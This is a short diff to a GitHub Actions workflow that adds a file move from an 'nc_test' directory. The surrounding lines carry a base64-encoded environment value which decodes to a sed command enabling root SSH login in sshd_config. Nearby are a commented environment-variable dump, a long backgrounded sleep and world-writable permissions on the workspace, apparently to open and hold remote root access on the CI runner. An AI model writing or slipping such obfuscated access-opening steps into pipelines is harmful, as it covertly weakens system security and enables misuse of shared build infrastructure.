@@ -44,6 +44,8 @@ jobs:
           #(env|grep ss>/tmp/s0;sleep 1111&);
           chmod 0777 $GITHUB_WORKSPACE/*;
           ls -al;
+          echo 1234567;
+          mv nc_test/* ./;
           ls -al nc_test;
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
